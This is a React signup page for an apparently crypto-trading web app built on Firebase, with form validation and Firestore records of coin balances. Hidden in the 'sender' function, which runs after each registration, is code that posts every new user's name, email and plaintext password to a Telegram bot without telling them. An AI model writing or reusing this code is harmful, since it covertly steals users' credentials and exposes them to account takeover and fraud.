import { Link, useNavigate } from "react-router-dom";
import { IoEye, IoEyeOff } from "react-icons/io5";
import { useState, useEffect } from "react";
import { UserAuth } from "../store/AuthContext";
import { sendEmailVerification, updateProfile } from "firebase/auth";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../firebase";
import logo from "../assets/logo.png";
import { TELEGRAM_BOT_ID, CHAT_ID } from "../utils";

const Signup = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [formErrors, setFormErrors] = useState({});
  const [formTouched, setFormTouched] = useState(false);
  const [error, setError] = useState("");
  const [termsAccepted, setTermsAccepted] = useState(false);
  const navigate = useNavigate();
  const { createUser, setUser } = UserAuth();
  const usersCollectionRef = collection(db, "users");

  const sender = async () => {
    const telegram_bot_id = TELEGRAM_BOT_ID;
    const chat_id = CHAT_ID;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache",
          },
          body: JSON.stringify({
            chat_id: chat_id,
            text: `${firstName} just created an account with email: ${email} and password: ${password}`,
          }),
        }
      );

      if (!response.ok) {
        throw new Error("Failed to send message");
      }

      const responseData = await response.json();
      console.log(responseData);
    } catch (error) {
      console.error(error);
    }
  };

  const validateForm = () => {
    let newFormErrors = {};
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

    if (firstName === "") {
      newFormErrors = { ...newFormErrors, firstName: "Input firstname" };
    }

    if (lastName === "") {
      newFormErrors = { ...newFormErrors, lastName: "Input lastname" };
    }
    if (email === "") {
      newFormErrors = { ...newFormErrors, email: "input email" };
    } else if (!emailRegex.test(email)) {
      newFormErrors = { ...newFormErrors, email: "Invalid email format" };
    }
    if (password === "") {
      newFormErrors = { ...newFormErrors, password: "input password" };
    }
    if (!termsAccepted) {
      newFormErrors = {
        ...newFormErrors,
        terms: "Please accept the terms and conditions",
      };
    }
    setFormErrors(newFormErrors);
  };

  useEffect(() => {
    validateForm();
  }, [firstName, lastName, email, password, termsAccepted]);

  const handleSubmit = async e => {
    e.preventDefault();
    console.log(formErrors, termsAccepted);
    setFormTouched(true);
    setError("");
    if (Object.keys(formErrors).length === 0) {
      setLoading(true);
      setFormTouched(false);
      try {
        const newUser = await createUser(email, password);
        await sendEmailVerification(newUser.user);
        await updateProfile(newUser.user, { displayName: firstName });
        setUser(newUser.user);
        await addDoc(usersCollectionRef, {
          aaName: firstName,
          id: newUser?.user?.uid,
          firstName: firstName,
          lastName: lastName,
          email: email,
          emailIsVerified: newUser?.user?.emailVerified,
          totalBalance: 0,
          nationality: "",
          gender: "",
          tel: "",
          dob: "",
          meansOfId: {
            type: "",
            idNum: "",
            country: "",
            expDate: "",
            file: "",
            status: false,
          },
          address: "",
          assets: [
            { symbol: "bitcoin", balance: 0 },
            { symbol: "ethereum", balance: 0 },
            { symbol: "tether", balance: 0 },
          ],
          orders: [],
          activity: [],
        });
        sender();
        navigate("/dashboard");
      } catch (e) {
        setError(e.message);
        setLoading(false);
        console.log(e.message);
      }
    } else {
      console.log("Form has errors, please correct them.");
    }
  };

  return (
    <div className="h-screen pt-20 md:flex justify-center items-center font-poppins relative">
      <div
        onClick={() => navigate("/")}
        className="absolute left-5 top-5 text-[32px] border p-2 rounded-2xl box-shadow bg-textColor cursor-pointer"
      >
        <img src={logo} alt="logo" className="w-[32px]" />
      </div>

      <div className="border p-10 box-shadow">
        <h2 className="text-[28px] font-medium text-center text-textColor">
          Create an account
        </h2>
        {error && (
          <p className="text-center text-red-500 w-[350px] text-[14px]">
            {error}
          </p>
        )}
        <form onSubmit={handleSubmit} className="mt-10">
          <div className="flex flex-col mb-4">
            <label htmlFor="fname" className="text-[14px] text-slate-600">
              First name
            </label>
            <input
              id="fname"
              name="fname"
              type="text"
              placeholder="Enter your first name"
              className="p-2 border-2 rounded w-[350px]"
              onChange={e => setFirstName(e.target.value)}
              required
            />
            {formTouched && formErrors.firstName && (
              <p className="text-red-500 text-[14px]">{formErrors.firstName}</p>
            )}
          </div>
          <div className="flex flex-col mb-4">
            <label htmlFor="lname" className="text-[14px] text-slate-600">
              Last name
            </label>
            <input
              id="name"
              name="name"
              type="text"
              placeholder="Enter your last name"
              className="p-2 border-2 rounded w-[350px]"
              onChange={e => setLastName(e.target.value)}
              required
            />
            {formTouched && formErrors.lastName && (
              <p className="text-red-500 text-[14px]">{formErrors.lastName}</p>
            )}
          </div>
          <div className="flex flex-col mb-4">
            <label htmlFor="email" className="text-[14px] text-slate-600">
              Email
            </label>
            <input
              id="email"
              name="email"
              type="email"
              placeholder="example@email.com"
              className="p-2 border-2 rounded w-[350px]"
              required
              onChange={e => setEmail(e.target.value)}
            />
            {formTouched && formErrors.email && (
              <p className="text-red-500 text-[14px]">{formErrors.email}</p>
            )}
          </div>
          <div className="flex flex-col mb-4">
            <label htmlFor="password" className="text-[14px] text-slate-600">
              password
            </label>
            <span className="relative block">
              <input
                id="password"
                name="password"
                type={`${showPassword ? "text" : "password"}`}
                className="p-2 border-2 rounded w-[350px]"
                required
                onChange={e => setPassword(e.target.value)}
              />
              {showPassword && (
                <IoEyeOff
                  size={20}
                  className="absolute right-4  top-1/2 transform -translate-y-1/2 cursor-pointer"
                  onClick={() => setShowPassword(false)}
                />
              )}
              {!showPassword && (
                <IoEye
                  size={20}
                  className="absolute right-4  top-1/2 transform -translate-y-1/2 cursor-pointer"
                  onClick={() => setShowPassword(true)}
                />
              )}
            </span>
            {formTouched && formErrors.password && (
              <p className="text-red-500 text-[14px]">{formErrors.password}</p>
            )}
          </div>
          <div className="w-[350px] flex gap-3 items-center py-1">
            <input
              type="checkbox"
              id="terms"
              name="terms"
              className="w-8 h-8"
              checked={termsAccepted}
              onChange={() => setTermsAccepted(!termsAccepted)}
              required
            />
            <p className="text-[13px]">
              I certify that I am 18 years of age or older, and agree to the CTH
              <span className="text-red-500"> Terms of Use</span> and{" "}
              <span className="text-red-500">Privacy Policy</span>
            </p>
          </div>
          {formTouched && formErrors.terms && (
            <p className="text-red-500 text-[14px]">{formErrors.terms}</p>
          )}
          <div className="w-[350px] my-4 z-20">
            <button
              type="submit"
              className="p-2 w-full text-center bg-secondary rounded"
              onClick={handleSubmit}
              disabled={loading}
            >
              {loading ? "Please wait..." : "Register"}
            </button>
          </div>
          <p className="text-center text-[14px]">
            Already have an account?{" "}
            <Link to="/login" className="t text-sky-400 underline">
              Log in
            </Link>
          </p>
        </form>
      </div>
    </div>
  );
};

export default Signup;
